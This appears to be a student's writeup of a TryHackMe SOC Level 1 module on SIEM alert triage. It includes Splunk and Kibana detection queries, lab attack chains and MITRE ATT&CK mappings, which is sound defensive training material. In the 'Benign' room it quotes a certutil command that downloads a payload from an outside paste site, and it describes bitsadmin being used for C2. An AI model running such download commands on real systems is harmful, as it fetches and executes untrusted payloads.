# 📊 SIEM Triage for SOC — Module Writeup

> **Module:** SIEM Triage for SOC | **Path:** SOC Level 1  
> **Platform:** TryHackMe  
> **Tools Used:** Splunk, Kibana (Elastic Stack)  
> **Status:** ✅ Completed

---

## 📖 About This Module

This module is where everything learned in the SOC Level 1 path comes together. Rather than teaching individual skills in isolation, it drops you directly into simulated SOC scenarios — handed an alert and told to figure out what happened.

The module covers how SIEM solutions detect early signs of attacks, how to investigate SOC alerts, and how to correlate logs from multiple sources to build a complete incident timeline. The final two rooms are pure challenge labs with no guidance — just a scenario and a SIEM instance.

> *"For the first time, I wasn't learning a concept. I was handed a real alert and told to figure out what happened."*

---

## 🗂️ Rooms in This Module

| # | Room | Tool | Type | Focus |
|---|------|------|------|-------|
| 1 | [Log Analysis with SIEM](#1-log-analysis-with-siem) | Splunk | Guided | SIEM fundamentals, log source types, correlation |
| 2 | [Alert Triage with Splunk](#2-alert-triage-with-splunk) | Splunk | Guided | Brute force, persistence, web shell detection |
| 3 | [Alert Triage with Elastic](#3-alert-triage-with-elastic) | Kibana | Guided | Web attack, Windows intrusion, data exfiltration |
| 4 | [ItsyBitsy](#4-itsybitsy) | Kibana | ⚔️ Challenge | C2 communication detection via LOLBIN |
| 5 | [Benign](#5-benign) | Splunk | ⚔️ Challenge | Compromised host investigation, LOLBIN, C2 download |

---

## 🧠 Core Concepts Learned

### SIEM Fundamentals
| Concept | Description |
|---------|-------------|
| **Centralisation** | Pulling logs from across the entire environment into one place — firewalls, endpoints, web servers, Linux auth logs, Windows Sysmon |
| **Normalisation** | Converting raw logs from different formats into a consistent structure for querying |
| **Correlation** | Linking individual, seemingly unrelated events across sources to spot complex attack patterns |

### Log Sources Used Across the Module
| Log Type | Platform | What It Reveals |
|----------|----------|-----------------|
| Windows Event Logs (WinEventLogs) | Splunk / Elastic | Logons, account changes, process creation |
| Sysmon | Splunk / Elastic | Network connections, file creation, process trees |
| Linux Auth Logs | Splunk | SSH logins, sudo usage, privilege escalation |
| Web Server Logs (IIS / Apache) | Splunk / Elastic | HTTP requests, brute force, web shell activity |
| HTTP Connection Logs | Kibana | C2 beaconing, LOLBIN downloads, traffic anomalies |

---

## 🔍 Room Summaries

### 1. Log Analysis with SIEM

**Tool:** Splunk | **Type:** Guided

The foundation room. Covers SIEM theory and then puts it into practice with hands-on Splunk scenarios across Windows, Linux, and web log sources.

**Key scenarios investigated:**
- A masqueraded binary `SharePoInt.exe` running from `C:\Windows\Temp\` — traced via Event ID 3 (network connection) to find its MD5 hash and a malicious scheduled task named `Office365 Install`
- SSH persistence on a Linux server — a `remote-ssh` account created after a brute-force login, following privilege escalation to root by user `jack-brown`
- WordPress brute force attack — `/wp-login.php` targeted with high request volume

**Key Splunk queries:**
```splunk
# Detect suspicious network connection
index="_index_used" EventCode=3

# Find malicious process by image path
index="_index_used" Image="C:\\Windows\\Temp\\SharePoInt.exe"

# Detect remote-ssh account creation on Linux
index="_index_used" | search "Account Created" OR "new user" OR "useradd"

# Find privilege escalation via sudo
index="_index_used" "sudo:" "session opened"
```

**What I learned:** Correlation is the most powerful SIEM skill. A single suspicious event means little — but a network connection, followed by a process spawn, followed by a scheduled task creation tells a complete story.

---

### 2. Alert Triage with Splunk

**Tool:** Splunk | **Type:** Guided

Three separate alert scenarios across a Linux server, a Windows workstation, and a web server — simulating a real first SOC shift.

**Scenario 1 — Linux Brute Force & Persistence:**
- 500 failed SSH login attempts against `john.smith` over 9 minutes
- Attacker gained access, escalated to root via `sudo`, created persistence account `system-utm`

**Scenario 2 — Windows Persistence via Scheduled Task:**
- Malicious scheduled task traced back through Sysmon logs via parent process ID

**Scenario 3 — Web Shell Deployment:**
- Hydra brute force against web server → web shell `b374k.php` deployed
- Traced attacker's user agent and post-exploitation web shell interactions

**Key Splunk queries:**
```splunk
# Count failed SSH attempts against specific user
index="linux-alert" sourcetype="linux_secure" "Failed password for john.smith"
| stats count as Failed_Attempts

# Identify brute force duration by attacker IP
index="linux-alert" sourcetype="linux_secure" 10.10.242.248
| stats earliest(_time) as start latest(_time) as end
| eval duration_mins=round((end-start)/60,2)

# Detect privilege escalation via sudo
index="linux-alert" sourcetype="linux_secure" "sudo:" "session opened"

# Find persistence account creation
index="linux-alert" sourcetype="linux_secure" "new user"

# Find parent process of malicious scheduled task
index="win-alert" ParentProcessId=4128
| table _time ParentProcessId CommandLine

# Identify web shell activity via Hydra user agent
index=web-alert clientip=171.251.232.40 useragent="Mozilla/5.0 (Hydra)"
| sort + _time | head 1 | table _time
```

**What I learned:** The queries are not the hard part — knowing what to look for next is. Reading logs and asking the right follow-up question is the real skill.

---

### 3. Alert Triage with Elastic

**Tool:** Kibana (Elastic Stack) | **Type:** Guided

A single extended investigation across an IIS web server and a Windows endpoint — using KQL (Kibana Query Language) to build the full attack chain.

**Attack chain uncovered:**
- Multiple POST requests to a suspicious endpoint — web exploitation attempt
- `cmd=` query parameter abuse — web shell command execution (`hostname` command traced to `errorEE.aspx`)
- Pivot to Windows logs — Administrator account logon (Event ID 4624)
- New user account created and added to Remote Desktop Users and Administrators groups (Event ID 4732)
- PowerShell used to discover Domain Admins (`net group "Domain Admins" /domain`)
- Data exfiltration — `Rar.exe` used to compress `finance_it_archive.rar` with hardcoded password `Spring2025!`

**Key KQL queries:**
```kql
# Filter web logs to specific attacker IP and POST requests
_index: weblogs and client.ip: 203.0.113.55 and http.request.method: POST

# Find cmd= parameter abuse
_index: weblogs and url.query: *cmd=*

# Find specific web shell command execution
_index: weblogs and "errorEE.aspx" and @timestamp: "Jul 20, 2025 @ 04:45:50.000"

# Detect Administrator logon after web shell execution
@timestamp >= "2025-07-20T05:11:22" and winlog.event_id: 4624
and winlog.event_data.TargetUserName: "Administrator"

# Find new user account creation
@timestamp >= "2025-07-20T05:11:27" and winlog.event_id: 1
and user.name: "Administrator"

# Detect group membership change (added to Administrators)
@timestamp >= "2025-07-20T05:13:15" and winlog.event_id: 4732
and message: *Administrators*

# Find PowerShell domain discovery
event.module: powershell and @timestamp >= "2025-07-20T05:16:14.628"

# Detect data exfiltration via RAR
process.name: "Rar.exe"
```

**What I learned:** Switching from Splunk to Kibana reinforced that the investigative mindset is tool-agnostic. Filter → Pivot → Correlate → Validate works the same way regardless of the SIEM platform.

---

### 4. ItsyBitsy

**Tool:** Kibana | **Type:** ⚔️ Challenge

A pure challenge room — no guidance. IDS alert fired for potential C2 communication from a user in the HR department. One week of HTTP connection logs available in Kibana.

**Attack chain uncovered:**
- Source IP `192.166.65.54` accounting for only 0.4% of traffic — classic low-frequency C2 beacon
- User-agent `bitsadmin` identified — a Windows LOLBIN used to silently download files
- Destination: `pastebin.com` — legitimate platform abused as C2 infrastructure
- Full C2 URL: `pastebin.com/yTg0Ah6a` → file: `secret.txt` → flag recovered
- Destination IP `104.23.99.190` confirmed as C2 via AlienVault OTX

**Kibana steps:**
```
# Step 1 — Scope the investigation
Time filter → March 2022

# Step 2 — Identify suspicious source IPs
Fields Pane → click source_ip
→ 192.166.65.54 = 0.4% of traffic (suspicious minority)

# Step 3 — Check user agents
Fields Pane → click user_agent
→ bitsadmin found in 0.4% of traffic
→ Click [+] to filter → 2 events, both from 192.166.65.54

# Step 4 — Identify C2 domain
Expand event → host field → pastebin.com

# Step 5 — Get full C2 URL
Expand event → uri field → /yTg0Ah6a
→ Full URL: pastebin.com/yTg0Ah6a

# Step 6 — Recover payload
resp_mime_types: text/plain (hints .txt file)
Navigate to: https://pastebin.com/yTg0Ah6a → secret.txt → flag

# OSINT Validation
https://otx.alienvault.com/indicator/ip/104.23.99.190
→ Confirmed: Command and Control IP
```

**What I learned:** C2 traffic hides in the noise. Low-volume minority traffic from a single host is the signal — not something obviously suspicious. Minority traffic deserves the most attention.

---

### 5. Benign

**Tool:** Splunk | **Type:** ⚔️ Challenge

A pure challenge room — no guidance. IDS alert for suspicious process execution on an HR department host. Only Event ID 4688 (process creation) logs available in Splunk.

**Attack chain uncovered:**
- Imposter account `Amel1a` created — subtle variation of legitimate user `Amelia`
- `Chris.fort` (HR) running `schtasks` — scheduled task persistence
- `haroon` (HR) used `certutil.exe` (LOLBIN) to download payload from `controlc.com`
- Full command: `certutil.exe -urlcache -split -f https://controlc.com/e4d11035 benign.exe`
- Payload file `benign.exe` downloaded on `2022-03-04`
- Flag recovered from the C2 URL: `THM{KJ&*H^B0}`

**Key Splunk queries:**
```splunk
# Q1 — Total event count for March 2022
index=win_eventlogs
# (Set time range to March 2022)

# Q2 — Surface all unique usernames including rare ones
index=win_eventlogs
| top limit=11 UserName

# Q3 — Detect scheduled task activity
index=win_eventlogs schtasks
# (Sort by CommandLine field)

# Q4-Q10 — Detect LOLBIN and C2 activity in HR hosts
index=win_eventlogs HostName="*HR*"
| rare limit=20 CommandLine

# Targeted follow-up after identifying the user
index=win_eventlogs HostName="*HR*" UserName="haroon"
| table _time UserName HostName CommandLine
```

**What I learned:** The `rare` command is one of the most powerful threat hunting tools in Splunk. Attackers run unusual one-off commands that stand out immediately when you look at statistical outliers. One query unlocked answers to 7 out of 10 questions.

---

## 🎯 MITRE ATT&CK Techniques Covered

| Technique | ID | Room |
|-----------|----|------|
| Brute Force | T1110 | Alert Triage with Splunk, Log Analysis with SIEM |
| Valid Accounts | T1078 | Benign (Amel1a imposter account) |
| Scheduled Task / Job | T1053 | Benign, Alert Triage with Splunk |
| BITS Jobs | T1197 | ItsyBitsy (bitsadmin.exe) |
| Ingress Tool Transfer | T1105 | Benign (certutil.exe), ItsyBitsy |
| Web Service (C2) | T1102 | ItsyBitsy (Pastebin), Benign (controlc.com) |
| Web Shell | T1505.003 | Alert Triage with Splunk, Alert Triage with Elastic |
| Exploit Public-Facing Application | T1190 | Alert Triage with Elastic |
| OS Credential Dumping | T1003 | Alert Triage with Splunk |
| Data Compressed for Exfiltration | T1560 | Alert Triage with Elastic (Rar.exe) |
| Masquerading | T1036 | Log Analysis with SIEM (SharePoInt.exe), Benign (benign.exe) |
| Inhibit System Recovery | T1490 | Log Analysis with SIEM |

---

## 🛠️ Tools & Platforms Used

| Tool | Used In | Purpose |
|------|---------|---------|
| Splunk | Rooms 1, 2, 5 | SPL queries, log analysis, threat hunting |
| Kibana (ELK Stack) | Rooms 3, 4 | KQL queries, field filtering, log correlation |
| AlienVault OTX | ItsyBitsy | OSINT validation of C2 IP addresses |
| Browser | ItsyBitsy, Benign | Accessing C2 URLs to recover payload contents |

---

## 💡 Key Takeaways from the Module

1. **Correlation is the superpower.** A single suspicious event means nothing. A failed login → privilege escalation → new account creation → outbound connection tells a complete story.

2. **The `rare` command finds attackers.** Normal users repeat the same commands. Attackers run unusual one-off commands. Statistical outliers in `CommandLine` data are where threats hide.

3. **LOLBINs are everywhere.** `certutil.exe`, `bitsadmin.exe`, and other trusted Windows binaries are routinely abused. Knowing which binaries are commonly misused is as important as knowing what malware looks like.

4. **Legitimate platforms get abused for C2.** Pastebin, controlc.com, and similar sites are used as C2 infrastructure precisely because traffic to them is not blocked and looks normal.

5. **The investigative mindset is tool-agnostic.** Filter → Pivot → Correlate → Validate. This process works identically in Splunk and Elastic. The platform changes; the logic does not.

6. **Minority traffic deserves the most attention.** C2 beacons are low-frequency by design. 0.4% of traffic hiding a LOLBIN user-agent is more significant than 99.6% of normal browser traffic.

7. **OSINT validates log findings.** Checking destination IPs on AlienVault OTX, VirusTotal, or similar platforms is a standard and essential step in any SOC investigation.

---

> *"Security monitoring is not about finding one suspicious thing — it's about connecting enough dots to tell a confident story about what happened."*
